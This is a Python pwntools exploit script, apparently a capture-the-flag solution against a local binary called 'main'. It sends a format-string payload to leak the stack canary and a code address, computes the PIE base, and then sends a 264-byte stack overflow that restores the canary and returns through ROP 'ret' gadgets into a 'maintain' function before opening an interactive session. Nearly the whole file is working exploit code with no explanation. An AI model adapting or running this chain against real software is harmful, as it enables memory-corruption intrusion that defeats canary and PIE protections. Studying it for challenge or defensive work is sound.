#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'main')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

io = start()


io.sendlineafter(b'? ', b's')
io.sendlineafter(b'filename to print: ', b'%39$p %107$p')
io.sendlineafter(b'Enter URL: ', b'URL')

data = io.recvline_contains(b'Confirm printing:').strip()
leak_vals = data.split(b' from ')[0].split()
log.info(f"raw leaks: {leak_vals}")

canary = int(leak_vals[2], 16)
main = int(leak_vals[3], 16) 
log.success(f"canary = {hex(canary)}")
log.success(f"main = {hex(main)}")

exe.address = main - exe.sym['main']
log.success(f"PIE base = {hex(exe.address)}")

maintain = exe.symbols['maintain']
log.success(f"maintain() = {hex(maintain)}")

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]


io.sendlineafter(b'Enter credentials: ', flat(
    b'A'*264,             
    p64(canary),          
    p64(ret),         
    p64(ret), 
    p64(maintain)         
))


io.interactive()

